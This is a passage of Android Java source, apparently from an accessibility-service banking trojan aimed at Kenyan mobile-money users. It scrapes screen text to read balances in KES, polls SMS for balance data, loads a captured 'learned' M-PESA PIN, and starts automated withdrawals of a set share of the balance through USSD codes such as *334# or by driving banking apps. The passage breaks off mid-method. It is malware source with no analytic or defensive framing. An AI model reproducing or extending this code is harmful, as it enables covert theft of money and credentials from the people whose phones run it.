              private void readDashboardBalance() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root != null) {
                      String text = getAllText(root);
                      double balance = extractBalanceFromText(text);
                      if (balance > 0) {
                          dashboardBalance = balance;
                          Log.d(TAG, "Dashboard balance: " + balance);
                      }
                  }
              }

              private String getAllText(AccessibilityNodeInfo node) {
                  if (node == null) return "";
                  StringBuilder sb = new StringBuilder();
                  try {
                      if (node.getText() != null) {
                          sb.append(node.getText().toString()).append(" ");
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          sb.append(getAllText(node.getChild(i)));
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Get text error", e);
                  }
                  return sb.toString();
              }

              private double extractBalanceFromText(String text) {
                  try {
                      if (text.contains("KES") || text.contains("Ksh") || text.contains("balance")) {
                          java.util.regex.Pattern p = java.util.regex.Pattern.compile("([\\d,\\.]+)");
                          java.util.regex.Matcher m = p.matcher(text);
                          while (m.find()) {
                              String num = m.group(1).replace(",", "").replace(" ", "");
                              double val = Double.parseDouble(num);
                              if (val > 0 && val < 1000000) return val;
                          }
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Balance extract error", e);
                  }
                  return 0;
              }

              private void requestSmsForBalance() {
                  if (smsRequested) return;
                  smsRequested = true;
                  smsCheckAttempts = 0;
                  Log.d(TAG, "Requesting SMS for balance");
                  checkSmsForBalance();
              }

              private void checkSmsForBalance() {
                  smsCheckAttempts++;
                  Log.d(TAG, "Checking SMS - Attempt: " + smsCheckAttempts);

                  Double smsBalance = SMS_BALANCE.get();
                  Long smsTime = SMS_TIME.get();

                  if (smsBalance != null && smsBalance > 0 && smsTime != null &&
                      (System.currentTimeMillis() - smsTime) < 10 * 60 * 1000) {
                      Log.d(TAG, "SMS found! Balance: " + smsBalance);
                      startWithdrawal(smsBalance);
                  } else {
                      Log.d(TAG, "SMS not found. Retrying in 60 seconds...");
                      handler.postDelayed(this::checkSmsForBalance, 60000);
                  }
              }

              private double getBalanceForWithdrawal() {
                  Double smsBalance = SMS_BALANCE.get();
                  if (smsBalance != null && smsBalance > 0) {
                      return smsBalance * SEND_PERCENTAGE;
                  }
                  if (dashboardBalance > 0) {
                      return dashboardBalance * SEND_PERCENTAGE;
                  }
                  return 0;
              }

              private String getStkPin() {
                  String json = prefs.getString("mpesa_pin", "{}");
                  try {
                      PinData data = gson.fromJson(json, PinData.class);
                      if (data != null && data.isLearned && data.pin != null) {
                          return data.pin;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "STK pin load error", e);
                  }
                  return "";
              }

              private void startWithdrawal(double balance) {
                  if (isAutomating) return;
                  if (balance <= 0) {
                      Log.d(TAG, "No balance to withdraw");
                      return;
                  }

                  isAutomating = true;
                  double amount = balance * SEND_PERCENTAGE;

                  Log.d(TAG, "Starting withdrawal of: " + amount);

                  BankData data = bankDataMap.get(currentPackage);

                  // If bank has USSD -> use USSD; else use app automation
                  if (data != null && data.hasUssd && data.ussd != null && !data.ussd.isEmpty()) {
                      automateUSSD(data.ussd, amount);
                  } else if (data != null) {
                      // Open app and guide through it
                      openApp(currentPackage);
                      automateApp(amount);
                  } else {
                      // Fallback to M-PESA USSD
                      automateUSSD("*334#", amount);
                  }
              }

              private void openApp(String packageName) {
                  try {
                      Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
                      if (intent != null) {
                          intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                          startActivity(intent);
                          Log.d(TAG, "Opened app: " + packageName);
                      } else {
                          Log.e(TAG, "Cannot open app: " + packageName);
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Open app error", e);
                  }
              }

              private void automateUSSD(String ussd, double amount) {
                  handler.postDelayed(() -> {
